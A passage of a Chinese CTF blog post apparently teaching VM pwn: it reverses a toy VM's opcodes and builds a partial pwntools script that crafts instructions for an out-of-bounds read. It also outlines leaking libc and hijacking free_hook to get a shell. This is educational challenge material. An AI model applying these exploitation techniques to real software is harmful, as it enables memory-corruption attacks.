alt="image-20250228210640842"></p><ul><li>继续分析，接下来的<code>if</code>语句稍微有点长，还是需要逐步分析，这个<code>if</code>语句是从第<code>19</code>行到第<code>76</code>行。<ul><li>我们先从上到下进行分析，当<code>a1</code>的<code>9-16</code>位的值为<code>0xB0</code>时，执行的是寄存器的异或操作</li><li>当<code>a1</code>的<code>25-32</code>位的值为<code>0xD0</code>时，执行的是寄存器的值位移的操作</li><li>当<code>a1</code>的<code>25-32</code>位的值为<code>224</code>即(<code>0xE0</code>时)，执行的是就会设置<code>running=0</code>也就是将要退出执行，如果<code>reg[13]</code>即<code>sp</code>寄存器的值为<code>0</code>还会输出退出操作。</li><li>当<code>a1</code>的<code>25-32</code>位大于<code>0xD0</code>并且不是<code>0xFF</code>就会执行<code>nop</code>操作</li><li>当<code>a1</code>的<code>25-32</code>位大于<code>0xD0</code>，且不等于<code>0xFF</code>和<code>0xE0</code>程序就会输出<code>0-15</code>这16个寄存器的值，并且会输出<code>HALT</code>。<strong>其实这个地方的执行逻辑并不是这样的，而是任意一个寄存器的值最高位有<code>0xff</code>都会输出这些寄存器的值，并退出执行。这是在后面动态调试的时候才得到的运行逻辑</strong></li></ul></li></ul><p><img src="/2025/02/22/CTFblog/PWN%E7%B3%BB%E5%88%97blog/VM_pwn/vm-pwn%E5%85%A5%E9%97%A8/image-20250228220123566.png" alt="image-20250228220123566"></p><ul><li>接下来继续分析<ul><li>当<code>a1</code>的<code>25-32</code>位为<code>0xC0</code>的时候就会执行左移操作</li></ul></li></ul><p><img src="/2025/02/22/CTFblog/PWN%E7%B3%BB%E5%88%97blog/VM_pwn/vm-pwn%E5%85%A5%E9%97%A8/image-20250228221901625.png" alt="image-20250228221901625"></p><ul><li>之后就是如下操作<ul><li>当<code>a1</code>的<code>25-32</code>位为<code>0x90</code>时，就会进行<code>与</code>操作</li><li>当<code>a1</code>的<code>25-32</code>位为<code>0xA0</code>时，就会进行<code>或</code>操作</li><li>当<code>a1</code>的<code>25-32</code>位为<code>0x80</code>时，就会进行<code>减</code>操作</li></ul></li></ul><p><img src="/2025/02/22/CTFblog/PWN%E7%B3%BB%E5%88%97blog/VM_pwn/vm-pwn%E5%85%A5%E9%97%A8/image-20250228222031001.png" alt="image-20250228222031001"></p><ul><li>逆向到这里我们会注意到上面的代码就都是对寄存器的操作，而接下去的代码就是会有对内存（即全局变量<code>memory</code>）进行操作。<ul><li>看到下面代码我们发现并没有使用到变量<code>v3</code>，这边都是<strong>二寄存器操作</strong>或者<strong>一寄存器操作</strong></li><li>从上到下依次执行的操作为当<code>a1</code>的<code>9-16</code>位为<code>0x30</code>时会进行<code>直接寻址</code>操作，即寄存器的值被当做地址去取相应内存中的值。</li><li>当<code>a1</code>的<code>25-32</code>位为<code>0x50</code>时就会先将<code>reg[13]</code>即<code>SP</code>指针的值给<code>eax</code>，之后将<code>SP=SP+1</code>，然后将<code>reg[v4]</code>的值放入<code>stack[eax]</code>，这个操作类似于<code>Push</code>，其中<code>stack</code>也是一个全局数组，这个数组有16个元素，并且长<code>4</code>字节。</li><li>当<code>a1</code>的<code>25-32</code>位为<code>0x60</code>时就是类似于<code>Pop</code>的操作，<code>Pop reg[v4]</code></li><li>当<code>a1</code>的<code>25-32</code>位为<code>0x40</code>时就是类似于<code>read</code>操作，将寄存器的值读入内存中。</li><li>当<code>a1</code>的<code>25-32</code>位为<code>0x10</code>时，将<code>CODE</code>的值给指定寄存器<code>reg[v4]</code></li><li>当<code>a1</code>的<code>25-32</code>位为<code>0x20</code>时，也就是相当于一个将寄存器<code>置0</code>的操作。</li><li>到此为止<code>execute()</code>函数就逆向完成了</li></ul></li></ul><p><img src="/2025/02/22/CTFblog/PWN%E7%B3%BB%E5%88%97blog/VM_pwn/vm-pwn%E5%85%A5%E9%97%A8/image-20250228222532625.png" alt="image-20250228222532625"></p><p><img src="/2025/02/22/CTFblog/PWN%E7%B3%BB%E5%88%97blog/VM_pwn/vm-pwn%E5%85%A5%E9%97%A8/image-20250228224448090.png" alt="image-20250228224448090"></p><ul><li>这时我们就开始逆向<code>sendcomment()</code>这个函数，这个函数其实没什么好逆向的，就是一个<code>free</code>操作，但是没有将指针置0</li></ul><p><img src="/2025/02/22/CTFblog/PWN%E7%B3%BB%E5%88%97blog/VM_pwn/vm-pwn%E5%85%A5%E9%97%A8/image-20250228225559508.png" alt="image-20250228225559508"></p><ul><li>还有一个这个函数<code>signal_handler()</code>，这个函数就是一个退出操作，锁得比较死，没什么利用空间</li></ul><p><img src="/2025/02/22/CTFblog/PWN%E7%B3%BB%E5%88%97blog/VM_pwn/vm-pwn%E5%85%A5%E9%97%A8/image-20250228225849573.png" alt="image-20250228225849573"></p><h2 id="level_2分析2"><a href="#level-2分析2" class="headerlink" title="level_2分析2"></a>level_2分析2</h2><ul><li>接下来我们就继续对指令集进行一个总结。以便我们后续进行操作。首先我们可以确定，这个操作码<code>CODE</code>并不是可扩展操作码，所以这就会更好理解。</li><li>在上面的指令中，一般情况都是这样的形式，而且这个指令并没有进行指令扩展操作。</li><li>实际上，指令也就使用了高<code>4</code>位，而寄存器编号也就使用了各自的低<code>4</code>位。</li><li>其中目的寄存器是变量<code>v4</code>存储，<code>9-16</code>位的源寄存器是<code>v3</code>存储，<code>1-8</code>位的源寄存器是<code>v2</code>存储，且二元运算和一元运算都没有使用<code>v3</code></li></ul><p><img src="/2025/02/22/CTFblog/PWN%E7%B3%BB%E5%88%97blog/VM_pwn/vm-pwn%E5%85%A5%E9%97%A8/image-20250228232928172.png" alt="image-20250228232928172"></p><ul><li>然后接下来我们对汇编指令做一个汇总，并且给出初始寄存器的值：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x10</span>  reg[v4] = code</span><br><span class="line"><span class="number">0x20</span>  reg[v4] = <span class="number">0</span></span><br><span class="line"><span class="number">0x30</span>  reg[v4] = memory[reg[v2]]     write</span><br><span class="line"><span class="number">0x40</span>  memory[reg[v2]] = reg[v4]     read</span><br><span class="line"><span class="number">0x50</span>  push reg[v4]</span><br><span class="line"><span class="number">0x60</span>  pop  reg[v4]</span><br><span class="line"><span class="number">0x70</span>  reg[v4] = reg[v2] + reg[v3]    add</span><br><span class="line"><span class="number">0x80</span>  reg[v4] = reg[v3] - reg[v2]    sub</span><br><span class="line"><span class="number">0x90</span>  reg[v4] = reg[v2] &amp; reg[v3]    and </span><br><span class="line"><span class="number">0xA0</span>  reg[v4] = reg[v2] | reg[v3]    or</span><br><span class="line"><span class="number">0xB0</span>  reg[v4] = reg[v2] ^ reg[v3]    xor</span><br><span class="line"><span class="number">0xC0</span>  reg[v4] = reg[v3] &lt;&lt; reg[v2]   左移</span><br><span class="line"><span class="number">0xD0</span>  reg[v4] = reg[v3] &gt;&gt; reg[v2]   右移</span><br><span class="line"><span class="number">0xE0</span>  <span class="built_in">exit</span></span><br><span class="line">&gt; <span class="number">0xD0</span> 且 ≠ <span class="number">0xE0</span> ≠ <span class="number">0xFF</span>  nop</span><br><span class="line"><span class="number">0xFF</span>  输出所有寄存器的值并结束执行</span><br><span class="line">reg[<span class="number">0</span>]=<span class="number">0</span></span><br><span class="line">reg[<span class="number">1</span>]=<span class="number">0</span></span><br><span class="line">reg[<span class="number">2</span>]=<span class="number">0</span></span><br><span class="line">reg[<span class="number">3</span>]=<span class="number">0</span></span><br><span class="line">reg[<span class="number">4</span>]=<span class="number">0</span></span><br><span class="line">reg[<span class="number">5</span>]=<span class="number">0</span></span><br><span class="line">reg[<span class="number">6</span>]=<span class="number">0</span></span><br><span class="line">reg[<span class="number">7</span>]=<span class="number">0</span></span><br><span class="line">reg[<span class="number">8</span>]=<span class="number">0</span></span><br><span class="line">reg[<span class="number">9</span>]=<span class="number">0</span></span><br><span class="line">reg[<span class="number">10</span>]=<span class="number">0</span></span><br><span class="line">reg[<span class="number">11</span>]=<span class="number">0</span></span><br><span class="line">reg[<span class="number">12</span>]=<span class="number">0</span></span><br><span class="line">reg[<span class="number">13</span>]=用户输入   SP</span><br><span class="line">reg[<span class="number">14</span>]=<span class="number">0</span></span><br><span class="line">reg[<span class="number">15</span>]=用户输入   IP</span><br></pre></td></tr></table></figure><ul><li>这里我们还知道了几个全局变量，即定义在<code>.bss</code>段上的变量<ul><li><code>comment</code>存储堆块地址</li><li><code>memory</code>模拟内存</li><li><code>reg</code>模拟寄存器</li><li><code>stack</code>模拟栈</li><li><code>running</code>执行标志</li></ul></li><li>这边我们注意到指向堆块的指针<code>comment</code>是存储在<code>.bss</code>段中的，而我们模拟的寄存器是<code>32</code>位的寄存器，所以我们很可能就可以通过负索引，造成越界读写，从而修改<code>comment</code>的值对使其指向其他地方。</li><li>之后我们可以向<code>comment</code>写入数据，从题目中可以得知<code>got</code>表不可写，所以我们这时可能就需要劫持<code>free_hook</code>，这里有两种劫持方式<ul><li>第一种是将<code>comment</code>修改为<code>free_hook</code>的地址劫持<code>free_hook</code>，为<code>ong_gadget</code></li><li>第二种是将<code>comment</code>修改为<code>free_hook-0x8</code>的地址处先写入<code>/bin/sh</code>，再写入<code>system_addr</code>，从而<code>getshll</code></li><li>不论是第一种还是第二种，我们都需要泄露libc地址，即将某个函数的地址打印出来，这就要使用到我们的<code>0xFF</code>这个功能，而我们不能在写入<code>code</code>的时候写入指令<code>0xFF</code>，我们需要在模拟运行的时候对指令进行修改才能使得<code>code</code>最高一位是<code>0xFF</code></li></ul></li><li>接下来我们就边写脚本边进行动态调试，对整个程序进行分析。</li><li>我们先编写如下脚本，形成模版，接下来我们就着重于对<code>code</code>进行编写了。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">code</span>(<span class="params">op,r1,r2,r3=<span class="number">0</span></span>):</span><br><span class="line">    a = (op &amp; <span class="number">0xFF</span>) &lt;&lt; <span class="number">24</span></span><br><span class="line">    a +=(r1 &amp; <span class="number">0xFF</span>) &lt;&lt; <span class="number">16</span></span><br><span class="line">    a +=(r2 &amp; <span class="number">0xFF</span>) &lt;&lt; <span class="number">8</span></span><br><span class="line">    a +=(r3 &amp; <span class="number">0xFF</span>)</span><br><span class="line">    <span class="built_in">print</span>(a)</span><br><span class="line"><span class="comment"># 设置PC=0x1000</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;PC:&#x27;</span>,<span class="built_in">str</span>(<span class="number">0x1000</span>).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"><span class="comment"># 设置SP=0x0</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;SP:&#x27;</span>,<span class="built_in">str</span>(<span class="number">0</span>).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"><span class="comment"># 设置Code_size=0x1000</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;CODE SIZE:&#x27;</span>,<span class="built_in">str</span>(<span class="number">0x1000</span>).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><ul><li>首先我们要先进行越界读，使得我们的模拟指令能读取到内存中的<code>got</code>表地址从而泄露libc的地址，我们先来查看一下<code>memory</code>地址与<code>got</code>表地址的偏移。这里我们选取泄露<code>write</code>的地址，首先我们计算偏移，我们发现偏移为<code>0x1036</code></li></ul><p><img src="/2025/02/22/CTFblog/PWN%E7%B3%BB%E5%88%97blog/VM_pwn/vm-pwn%E5%85%A5%E9%97%A8/image-20250301105110109.png" alt="image-20250301105110109"></p><p><img src="/2025/02/22/CTFblog/PWN%E7%B3%BB%E5%88%97blog/VM_pwn/vm-pwn%E5%85%A5%E9%97%A8/image-20250301105150536.png" alt="image-20250301105150536"></p><p><img src="/2025/02/22/CTFblog/PWN%E7%B3%BB%E5%88%97blog/VM_pwn/vm-pwn%E5%85%A5%E9%97%A8/image-20250301105316154.png" alt="image-20250301105316154"></p><ul><li>所以要进行越界读写，我们就首先要构造<code>-0x1036</code>，转换为<code>32</code>位的补码为：</li></ul><p><img src="/2025/02/22/CTFblog/PWN%E7%B3%BB%E5%88%97blog/VM_pwn/vm-pwn%E5%85%A5%E9%97%A8/image-20250301105432157.png" alt="image-20250301105432157"></p><ul><li>但是由于大部分寄存器的值都为<code>0</code>，所以我们先要想办法使得某个寄存器的值为<code>FFFF EFCA</code>，我们先通过：<ul><li><code>0x10000000</code>：即<code>reg[v4] = code</code>，这样就可以进行操作，使得<code>reg[0]=0x10000000</code></li><li><code>0x50000000</code>：即<code>push reg[0]</code></li><li><code>0x10000001</code>：即<code>reg[0] = 0x10000001</code></li><li><code>0x60010000</code>：即<code>pop reg[1]</code></li><li><code>0x80000001</code>：即<code>sub reg[0]=reg[0]-reg[1]</code>，从而得到数据1。</li></ul></li><li>由动态调试会发现寄存器的值如下：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">reg[<span class="number">0</span>]=<span class="number">1</span></span><br><span class="line">reg[<span class="number">1</span>]=<span class="number">0</span></span><br><span class="line">reg[<span class="number">2</span>]=<span class="number">0</span></span><br><span class="line">reg[<span class="number">3</span>]=<span class="number">0</span></span><br><span class="line">reg[<span class="number">4</span>]=<span class="number">0</span></span><br><span class="line">reg[<span class="number">5</span>]=<span class="number">0</span></span><br><span class="line">reg[<span class="number">6</span>]=<span class="number">0</span></span><br><span class="line">reg[<span class="number">7</span>]=<span class="number">0</span></span><br><span class="line">reg[<span class="number">8</span>]=<span class="number">0</span></span><br><span class="line">reg[<span class="number">9</span>]=<span class="number">0</span></span><br><span class="line">reg[<span class="number">10</span>]=<span class="number">0</span></span><br><span class="line">reg[<span class="number">11</span>]=<span class="number">0</span></span><br><span class="line">reg[<span class="number">12</span>]=<span class="number">0</span></span><br><span class="line">reg[<span class="number">13</span>]=<span class="number">0x0</span>    SP</span><br><span class="line">reg[<span class="number">14</span>]=<span class="number">0</span></span><br><span class="line">reg[<span class="number">15</span>]=没去算   IP(PC)</span><br><span class="line"><span class="built_in">stack</span>[<span class="number">0</span>]=<span class="number">0</span></span><br></pre></td></tr></table></figure><ul><li>这时我们使用<code>add</code>命令，将<code>reg[1]</code>寄存器也变成<code>1</code>，再使用<code>add</code>命令将<code>reg[1]</code>变成<code>2</code>，之后使用<code>左移</code>命令，将<code>reg[2]</code>变成<code>4</code>，使用<code>add</code>命令使得<code>reg[3]</code>变成<code>8</code>，再使用<code>add</code>命令让<code>reg[4]</code>变成<code>16</code>。</li><li>此时继续动态调试得到，寄存器的布局如下：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">reg[<span class="number">0</span>]=<span class="number">1</span></span><br><span class="line">reg[<span class="number">1</span>]=<span class="number">2</span></span><br><span class="line">reg[<span class="number">2</span>]=<span class="number">4</span></span><br><span class="line">reg[<span class="number">3</span>]=<span class="number">8</span></span><br><span class="line">reg[<span class="number">4</span>]=<span class="number">16</span></span><br><span class="line">reg[<span class="number">5</span>]=<span class="number">0</span></span><br><span class="line">reg[<span class="number">6</span>]=<span class="number">0</span></span><br><span class="line">reg[<span class="number">7</span>]=<span class="number">0</span></span><br><span class="line">reg[<span class="number">8</span>]=<span class="number">0</span></span><br><span class="line">reg[<span class="number">9</span>]=<span class="number">0</span></span><br><span class="line">reg[<span class="number">10</span>]=<span class="number">0</span></span><br><span class="line">reg[<span class="number">11</span>]=<span class="number">0</span></span><br><span class="line">reg[<span class="number">12</span>]=<span class="number">0</span></span><br><span class="line">reg[<span class="number">13</span>]=<span class="number">0x0</span>    SP</span><br><span class="line">reg[<span class="number">14</span>]=<span class="number">0</span></span><br><span class="line">reg[<span class="number">15</span>]=<span class="number">0x103e9</span>   IP(PC)</span><br><span class="line"><span class="built_in">stack</span>[<span class="number">0</span>]=<span class="number">0</span></span><br></pre></td></tr></table></figure><ul><li>这时我们可以使用<code>&lt;&lt;</code>命令，先将使得<code>reg[5] = reg[0] &lt;&lt; reg[3]</code>，再使得<code>reg[5] = reg[5] &lt;&lt; reg[2]</code>，这样就可以构造出数据<code>0x1000</code>，然后使用<code>add</code>命令，加上三次<code>0x10</code>、一次<code>0x2</code>、一次<code>0x4</code>即可得到<code>0x1036</code></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">reg[<span class="number">0</span>]=<span class="number">1</span></span><br><span class="line">reg[<span class="number">1</span>]=<span class="number">2</span></span><br><span class="line">reg[<span class="number">2</span>]=<span class="number">4</span></span><br><span class="line">reg[<span class="number">3</span>]=<span class="number">8</span></span><br><span class="line">reg[<span class="number">4</span>]=<span class="number">16</span></span><br><span class="line">reg[<span class="number">5</span>]=<span class="number">0x1036</span></span><br><span class="line">reg[<span class="number">6</span>]=<span class="number">0</span></span><br><span class="line">reg[<span class="number">7</span>]=<span class="number">0</span></span><br><span class="line">reg[<span class="number">8</span>]=<span class="number">0</span></span><br><span class="line">reg[<span class="number">9</span>]=<span class="number">0</span></span><br><span class="line">reg[<span class="number">10</span>]=<span class="number">0</span></span><br><span class="line">reg[<span class="number">11</span>]=<span class="number">0</span></span><br><span class="line">reg[<span class="number">12</span>]=<span class="number">0</span></span><br><span class="line">reg[<span class="number">13</span>]=<span class="number">0x0</span>    SP</span><br><span class="line">reg[<span class="number">14</span>]=<span class="number">0</span></span><br><span class="line">reg[<span class="number">15</span>]=<span class="number">0x103e9</span>   IP(PC)</span><br><span class="line"><span class="built_in">stack</span>[<span class="number">0</span>]=<span class="number">0</span></span><br></pre></td></tr></table></figure><ul><li>这时我们使用<code>sub</code>命令就可以构造出负值，从而得到<code>负</code>索引，但是在得到<code>负</code>索引之后，发现一个问题，程序会直接输出所有寄存器的值，然后让用户输入内容，这并不是我们所期望的。</li></ul><p><img src="/2025/02/22/CTFblog/PWN%E7%B3%BB%E5%88%97blog/VM_pwn/vm-pwn%E5%85%A5%E9%97%A8/image-20250320152810648.png" alt="image-20250320152810648"></p><ul><li>所以我们不能使用<code>sub</code>去构造<code>负值</code>，我们现在来试试一下使用位移和加法操作是否可以构造出负值。我们现在就利用<code>sub</code>命令使得<code>reg[6]=reg[4]-reg[0]</code>，然后再使用<code>4</code>次位移操作，得到<code>最高位F</code>和<code>第二高位F</code>，然后再通过<code>add</code>命令，看看是可以不触发输出寄存器的值。</li><li>到目前为止，我们的代码如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;neww&quot;</span>]</span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">code</span>(<span class="params">op,r1,r2,r3=<span class="number">0</span></span>):</span><br><span class="line">    a = (op &amp; <span class="number">0xFF</span>) &lt;&lt; <span class="number">24</span></span><br><span class="line">    a +=(r1 &amp; <span class="number">0xFF</span>) &lt;&lt; <span class="number">16</span></span><br><span class="line">    a +=(r2 &amp; <span class="number">0xFF</span>) &lt;&lt; <span class="number">8</span></span><br><span class="line">    a +=(r3 &amp; <span class="number">0xFF</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(a))</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(a).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"><span class="comment"># PC=0x0</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;PC:&#x27;</span>,<span class="built_in">str</span>(<span class="number">0x1000</span>).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"><span class="comment"># SP=0x0</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;SP:&#x27;</span>,<span class="built_in">str</span>(<span class="number">0</span>).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"><span class="comment"># Code_size=0x1000</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;CODE SIZE:&#x27;</span>,<span class="built_in">str</span>(<span class="number">0x17</span>).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"><span class="comment"># code布置</span></span><br><span class="line">code(<span class="number">0x10</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">code(<span class="number">0x50</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">code(<span class="number">0x10</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line">code(<span class="number">0x60</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">code(<span class="number">0x80</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line"><span class="comment">#code(0x80,10,10,0)</span></span><br><span class="line">code(<span class="number">0x70</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>)</span><br><span class="line">code(<span class="number">0x70</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>)</span><br><span class="line">code(<span class="number">0xc0</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line">code(<span class="number">0x70</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">2</span>)</span><br><span class="line">code(<span class="number">0x70</span>,<span class="number">4</span>,<span class="number">3</span>,<span class="number">3</span>)</span><br><span class="line">code(<span class="number">0xc0</span>,<span class="number">5</span>,<span class="number">0</span>,<span class="number">3</span>)</span><br><span class="line">code(<span class="number">0xc0</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">2</span>)</span><br><span class="line">code(<span class="number">0x70</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">4</span>)</span><br><span class="line">code(<span class="number">0x70</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">4</span>)</span><br><span class="line">code(<span class="number">0x70</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">4</span>)</span><br><span class="line">code(<span class="number">0x70</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">2</span>)</span><br><span class="line">code(<span class="number">0x70</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">1</span>)</span><br><span class="line">code(<span class="number">0x80</span>,<span class="number">6</span>,<span class="number">4</span>,<span class="number">0</span>)</span><br><span class="line">code(<span class="number">0xc0</span>,<span class="number">6</span>,<span class="number">6</span>,<span class="number">4</span>)</span><br><span class="line">code(<span class="number">0xc0</span>,<span class="number">7</span>,<span class="number">6</span>,<span class="number">3</span>)</span><br><span class="line">code(<span class="number">0xc0</span>,<span class="number">8</span>,<span class="number">7</span>,<span class="number">2</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><ul><li>寄存器的值如下：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">reg[0]=1</span><br><span class="line">reg[1]=2</span><br><span class="line">reg[2]=4</span><br><span class="line">reg[3]=8</span><br><span class="line">reg[4]=16</span><br><span class="line">reg[5]=0x1036</span><br><span class="line">reg[6]=0x000f0000</span><br><span class="line">reg[7]=0x0f000000</span><br><span class="line">reg[8]=0xf0000000</span><br><span class="line">reg[9]=0</span><br><span class="line">reg[10]=0</span><br><span class="line">reg[11]=0</span><br><span class="line">reg[12]=0</span><br><span class="line">reg[13]=0x0    SP</span><br><span class="line">reg[14]=0</span><br><span class="line">reg[15]=0x103e9   IP(PC)</span><br><span class="line">stack[0]=0</span><br></pre></td></tr></table></figure><ul><li>这时我们再使用<code>add</code>命令，构造出最高位的<code>0xff</code>，但是还是会触发输出寄存器的值，从而退出执行。所以之前逆向的逻辑就有错误。</li></ul><p><img src="/2025/02/22/CTFblog/PWN%E7%B3%BB%E5%88%97blog/VM_pwn/vm-pwn%E5%85%A5%E9%97%A8/image-20250320194512974.png" alt="image-20250320194512974"></p><h2 id="level_2_exp"><a href="#level-2-exp" class="headerlink" title="level_2_exp"></a>level_2_exp</h2><ul><li></li></ul><h1 id="vm_pwn出题"><a href="#VM-PWN出题" class="headerlink" title="VM_PWN出题"></a>VM_PWN出题</h1><ul><li><p>如果我们要出一道<code>VMpwn</code>题，即制作一个简单的<code>VM</code>，我们的程序至少要有如下东西：</p><ul><li>需要准备<code>寄存器</code>和<code>栈内存</code>，用于数值的传递</li><li>如果要输出<code>字符串</code>还需要有一个<code>缓冲区BUFFER</code></li></ul></li><li><p><code>VMpwn</code>题中常见的设计如下：</p><ul><li>初始化分配模拟寄存器空间（即分配内存空间，将这个内存空间当做寄存器，可以是变量或者是其他可读可写的内存空间）</li><li>初始化分配模拟栈空间（STACK）</li><li>初始化分配模拟数据存储空间（BUFFER）</li><li>初始化分配存储OPCODE（机器指令）空间</li></ul></li></ul>]]></content>
    
    
    <summary type="html">浅浅入门一下vm_pwn</summary>
    
    
    
    <category term="CTF" scheme="http://iyheart.github.io/categories/CTF/"/>
    
    <category term="PWN" scheme="http://iyheart.github.io/categories/CTF/PWN/"/>
    
    
  </entry>
  
  <entry>
    <title>PWN刷题</title>
    <link href="http://iyheart.github.io/2025/02/18/CTFblog/PWN%E7%B3%BB%E5%88%97blog/PWN%E5%88%B7%E9%A2%98/"/>
    <id>http://iyheart.github.io/2025/02/18/CTFblog/PWN%E7%B3%BB%E5%88%97blog/PWN%E5%88%B7%E9%A2%98/</id>
    <published>2025-02-17T16:01:34.000Z</published>
    <updated>2025-03-03T14:16:17.537Z</updated>
    
